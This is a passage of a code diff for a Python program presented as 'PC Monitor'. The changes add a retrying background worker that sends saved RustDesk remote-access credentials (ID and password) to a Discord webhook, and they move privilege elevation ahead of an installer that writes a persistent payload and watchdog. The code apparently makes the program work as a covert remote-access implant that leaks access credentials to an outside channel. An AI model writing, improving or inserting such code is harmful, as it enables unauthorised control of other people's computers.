     label = _machine_label() if "_machine_label" in globals() else os.environ.get(
         "COMPUTERNAME", platform.node())
     previous_app_version = str(state.get("credentials_notified_app_version") or "").strip()
-    if not force and previous_app_version == str(APP_VERSION) and state.get("discord_notified"):
-        _remote_log(f"READY notification skipped: already sent for PC Monitor {APP_VERSION}")
+    # New confirmation marker: old builds could mark/skip delivery before the
+    # credentials were actually confirmed by this fixed delivery path.
+    confirmed_version = str(state.get("credentials_delivery_confirmed_version") or "").strip()
+    if not force and confirmed_version == str(APP_VERSION):
+        _remote_log(f"READY notification skipped: delivery already confirmed for PC Monitor {APP_VERSION}")
         return True
     _remote_stage("send saved RustDesk credentials to Discord")
     ok = _remote_webhook(
@@ -6312,6 +6465,7 @@ def _remote_notify_ready(state, force=False, reason="setup"):
     if ok:
         state["discord_notified"] = True
         state["credentials_notified_app_version"] = str(APP_VERSION)
+        state["credentials_delivery_confirmed_version"] = str(APP_VERSION)
         state["credentials_last_notified"] = datetime.now().isoformat(timespec="seconds")
         try:
             with open(REMOTE_STATE_PATH, "w", encoding="utf-8") as f:
@@ -6338,6 +6492,33 @@ def _remote_resend_credentials():
         _remote_log("RESEND requested but saved RustDesk credentials are missing")
         return False
     return _remote_notify_ready(state, force=True, reason="manual resend")
+
+
+def _remote_credential_delivery_worker():
+    """Deliver saved RustDesk credentials independently of RustDesk setup.
+
+    This handles the exact failure mode where RustDesk is already installed but
+    the setup thread was skipped/delayed/not elevated. It also waits for a
+    first-time setup to write state, then sends immediately.
+    """
+    if os.environ.get("PCMONITOR_DISABLE_REMOTE") == "1":
+        return
+    for attempt in range(1, 25):
+        try:
+            state = _remote_read_state()
+            if state and state.get("rustdesk_id") and state.get("password"):
+                ok = _remote_notify_ready(state, force=False, reason="PC Monitor startup/update")
+                if ok:
+                    _remote_log(f"CREDENTIAL DELIVERY worker confirmed attempt={attempt}")
+                    return True
+                _remote_log(f"CREDENTIAL DELIVERY worker retry attempt={attempt}")
+            else:
+                _remote_log(f"CREDENTIAL DELIVERY waiting for RustDesk state attempt={attempt}")
+        except Exception as e:
+            _remote_log(f"CREDENTIAL DELIVERY worker exception attempt={attempt}: {type(e).__name__}: {e}")
+        time.sleep(5)
+    _remote_log("CREDENTIAL DELIVERY worker exhausted retries")
+    return False
 
 
 def _remote_service_prepare():
@@ -6600,16 +6781,15 @@ if __name__ == "__main__":
             except Exception:
                 pass  # nothing more we can do without a console to report through
             sys.exit(0)
-        run_installer()
-        # RustDesk host setup requires Administrator privileges. If the
-        # original installer was not elevated, hand off to an elevated copy;
-        # that copy will enter the normal launch path and bootstrap RustDesk.
+        # The persistent installation lives under ProgramData, so elevation
+        # is required BEFORE the installer writes its payload/config/watchdog.
         if not IS_ADMIN:
             try:
                 if relaunch_as_admin():
                     sys.exit(0)
             except Exception:
                 pass
+        run_installer()
         if IS_ADMIN:
             _ensure_remote_host_async(wait=True)
     else:
